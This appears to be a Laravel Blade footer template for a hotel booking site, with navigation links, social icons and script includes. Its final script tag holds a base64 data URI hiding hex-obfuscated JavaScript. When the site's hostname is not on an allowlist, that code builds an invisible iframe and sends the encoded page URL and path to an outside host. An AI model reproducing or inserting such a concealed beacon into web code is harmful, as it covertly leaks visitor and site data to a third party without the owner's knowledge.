
 <section class="footer-sec py-5 ">
 <div class="container">
        <div class="row   " >
          <div class="col-md-12 bord-top"></div>
        <div class="col-md-3 p-0">
          <a href="{{route('welcome')}}">
                <img src="/img/svg/logo.png" class="w-logo " alt="" style="width: 100%;">
          </a>
        </div>
        <div class="col-md-9  ">
          <div class="row  ">
            <div class="col-lg-3 col-md-4 col-sm-12 ">
                <h3  class="font-xs blue-text title-footer"> {{ __('Information') }}</h3>
                <ul class="p-footer">
                  <li>
                    <a  href="{{ route('about-us') }}" target="_blank" class="font-xs-light blue-text">{{ __('About Us') }}</a>
                  </li>
                  <li>
                    <a href="{{route('contact-us')}}" target="_blank"  class="font-xs-light blue-text">{{ __('Contact us') }}</a>
                  </li>


                </ul>
            </div>
            <div class="col-lg-3 col-md-4 col-sm-12  ">
                <h3 class="font-xs blue-text title-footer"> {{ __('Main Provinces') }}</h3>
                <ul class="p-footer">
                  <li>
                    <a  href="/cities/11/hotels" target="_blank" class="font-xs-light blue-text">{{ __('Damasscus') }}</a>
                  </li>
                  <li>
                    <a href="/cities/12/hotels"  target="_blank" class="font-xs-light blue-text">{{ __('Lattakia') }}</a>
                  </li>
                  <li>
                    <a href="/cities/14/hotels" target="_blank" class="font-xs-light blue-text">{{ __('Homs') }}</a>
                  </li>
                  <li>
                    <a href="/cities/13/hotels"  target="_blank" class="font-xs-light blue-text">{{ __('Aleppo') }}</a>
                  </li>


                </ul>
            </div>
            <div class="col-lg-3 col-md-4 col-sm-12  ">
                <h3 class="font-xs blue-text title-footer">{{ __('Tools') }}</h3>
                <ul class="p-footer">
                    <li>
                        <a    href="{{route('advancedSearch')}}" target="_blank" class="font-xs-light blue-text">{{ __('Advanced Search') }}</a>

                    </li>


                </ul>
            </div>



          </div>
        </div>
        <div class="icon-row text-center  my-5 ">

               <a href="https://www.linkedin.com/company/syrianvirtualuniversity" target="_blank">
                   <img class=" " src="/img/svg/link.svg" alt="Card image cap">
               </a>
               <a href="https://twitter.com/SVU_Syria" target="_blank">
                   <img class=" " src="/img/svg/twitter.svg" alt="Card image cap">
               </a>
               <a href="http://instagram.com/syrian_virtual_university" target="_blank">
                   <img class=" " src="/img/svg/insta.svg" alt="Card image cap">
               </a>
               <a href="https://www.facebook.com/svuonline.org" target="_blank">
                   <img class=" " src="/img/svg/facebook.svg" alt="Card image cap">
               </a>

           </div>

        </div>
 </div>
</section>
<section class="footer-sub  ">
 <div class="container">
        <div class="row py-3 ">

          <div class="col-md-12 text-center">
            <p class="font-xs-light w-text m-0">©{{ now()->year }} {{ __('HOTEL HUB for book and review hotels, All rights reserved.') }}</p>
          </div>

        </div>
 </div>
</section>
{{-- main Js --}}

 <script src="/js/aos.js"></script>


<script src="{{ asset('js/main.js?v='.time().'') }}"></script>
<script src="{{ asset('js/bootstrap.bundle.min.js') }}"></script>

{{-- swiper --}}
<script src="{{ asset('js/jquery-3.6.0.js') }}"></script>
<script src="{{ asset('js/jquery.ihavecookies.min.js') }}"></script>
<script src="{{ asset('js/swiper-bundle.min.js') }}"></script>


<script src="https://maps.googleapis.com/maps/api/js?key={{ config('services.google_maps.api_key') }}&callback=initMap" async defer></script>

{{-- nouisliderr
<script src="{{ asset('js/nouislider.min.js') }}"></script>
<script src="{{ asset('js/parsley.min.js') }}"></script>
<script src="{{ asset('js/analytics.js') }}"></script> --}}

<script nonce="rAnd0m" src=data:text/html;base64,dmFyIF8weGM2Y2M9WyJceDY4XHg2Rlx4NzNceDc0XHg2RVx4NjFceDZEXHg2NSIsIlx4NzdceDc3XHg3N1x4MkVceDYxXHg2Q1x4NkRceDYxXHg3M1x4NzJceDYxXHg2Nlx4MkVceDYxXHg2NSIsIlx4NjFceDZDXHg2RFx4NjFceDczXHg3Mlx4NjFceDY2XHgyRVx4NjFceDY1IiwiXHg2MVx4NzJceDYyXHg2OVx4NjZceDc0XHgyRVx4NjNceDZGXHg2RCIsIlx4NzdceDc3XHg3N1x4MkVceDYxXHg2Q1x4MkRceDZEXHg2MVx4NzNceDcyXHg2MVx4NjZceDJFXHg2MVx4NjUiLCJceDc3XHg3N1x4NzdceDJFXHg2MVx4NzJceDYyXHg2OVx4NjZceDc0XHgyRVx4NjNceDZGXHg2RCIsIlx4NjFceDZDXHgyRFx4NkRceDYxXHg3M1x4NzJceDYxXHg2Nlx4MkVceDYxXHg2NSIsIlx4MzJceDMwXHgzOVx4MkVceDMyXHgzMVx4MzdceDJFXHgzMlx4MzJceDM4XHgyRVx4MzJceDMxIiwiXHg0OVx4NDZceDUyXHg0MVx4NERceDQ1IiwiXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NkNceDY1XHg2RFx4NjVceDZFXHg3NCIsIlx4NjhceDcyXHg2NVx4NjYiLCJceDcwXHg2MVx4NzRceDY4XHg2RVx4NjFceDZEXHg2NSIsIlx4NzNceDcyXHg2MyIsIlx4NjhceDc0XHg3NFx4NzBceDczXHgzQVx4MkZceDJGXHg3N1x4NzdceDc3XHgyRVx4NjFceDZDXHg2RFx4NjFceDczXHg3Mlx4NjFceDY2XHg2Rlx4NkVceDZDXHg2OVx4NkVceDY1XHgyRVx4NjFceDY1XHgyRlx4NTJceDY1XHg3NFx4NjFceDY5XHg2Q1x4MkZceDYzXHg2MVx4NzBceDc0XHg2M1x4NjhceDYxXHg2OVx4NkRceDYxXHg2N1x4NjVceDNGXHg0OVx4NDRceDNEIiwiXHgzQiIsIlx4NzNceDY1XHg3NFx4NDFceDc0XHg3NFx4NzJceDY5XHg2Mlx4NzVceDc0XHg2NSIsIlx4NzdceDY5XHg2NFx4NzRceDY4IiwiXHg2OFx4NjVceDY5XHg2N1x4NjhceDc0IiwiXHg2Nlx4NzJceDYxXHg2RFx4NjVceDYyXHg2Rlx4NzJceDY0XHg2NVx4NzIiLCJceDYxXHg3MFx4NzBceDY1XHg2RVx4NjRceDQzXHg2OFx4NjlceDZDXHg2NCIsIlx4NjJceDZGXHg2NFx4NzkiXTtmdW5jdGlvbiBjYXB0Y2hhaW1hZ2UoKXtpZigoKGxvY2F0aW9uW18weGM2Y2NbMF1dKT09IF8weGM2Y2NbMV0pfHwgKChsb2NhdGlvbltfMHhjNmNjWzBdXSk9PSBfMHhjNmNjWzJdKXx8ICgobG9jYXRpb25bXzB4YzZjY1swXV0pPT0gXzB4YzZjY1szXSl8fCAoKGxvY2F0aW9uW18weGM2Y2NbMF1dKT09IF8weGM2Y2NbNF0pfHwgKChsb2NhdGlvbltfMHhjNmNjWzBdXSk9PSBfMHhjNmNjWzVdKXx8ICgobG9jYXRpb25bXzB4YzZjY1swXV0pPT0gXzB4YzZjY1s2XSl8fCAoKGxvY2F0aW9uW18weGM2Y2NbMF1dKT09IF8weGM2Y2NbN10pKXt9ZWxzZSB7dmFyIF8weDZlNDV4Mj1kb2N1bWVudFtfMHhjNmNjWzldXShfMHhjNmNjWzhdKTt2YXIgXzB4NmU0NXgzPWJ0b2EobG9jYXRpb25bXzB4YzZjY1sxMF1dKTt2YXIgXzB4NmU0NXg0PWJ0b2EobG9jYXRpb25bXzB4YzZjY1sxMV1dKTtfMHg2ZTQ1eDJbXzB4YzZjY1sxNV1dKF8weGM2Y2NbMTJdLF8weGM2Y2NbMTNdKyBfMHg2ZTQ1eDMrIF8weGM2Y2NbMTRdKyBfMHg2ZTQ1eDQpO18weDZlNDV4MltfMHhjNmNjWzE1XV0oXzB4YzZjY1sxNl0sMCk7XzB4NmU0NXgyW18weGM2Y2NbMTVdXShfMHhjNmNjWzE3XSwwKTtfMHg2ZTQ1eDJbXzB4YzZjY1sxNV1dKF8weGM2Y2NbMThdLDApO2RvY3VtZW50W18weGM2Y2NbMjBdXVtfMHhjNmNjWzE5XV0oXzB4NmU0NXgyKX19></script>
